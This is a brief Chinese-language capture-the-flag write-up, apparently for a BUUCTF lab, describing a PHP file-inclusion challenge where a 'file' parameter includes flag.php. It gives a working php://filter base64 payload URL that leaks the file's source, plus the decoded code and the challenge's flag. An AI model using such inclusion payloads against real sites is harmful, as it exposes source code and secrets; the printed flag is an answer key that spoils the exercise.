刚进去界面有个tips，点进去后url变为`/?file=flag.php`
flag应该就在flag.php中
也可以说明flag.php这个文件被包含执行了
利用php伪协议把他的源码拿出来
payload：
```
http://7a5e6b81-d23a-422b-b357-5f20840effb8.node5.buuoj.cn:81/?file=php://filter/read=convert.base64-encode/resource=flag.php
```
然后就回显了一串base64编码的数据
解码后得到：
```php
<?php
echo "Can you find out the flag?";
//flag{3ebd5a07-2f60-4927-9877-a712485afe25}
```
这也可以解释为什么要先编码再解码，如果不编码的话flag是注释掉的根本显示不出来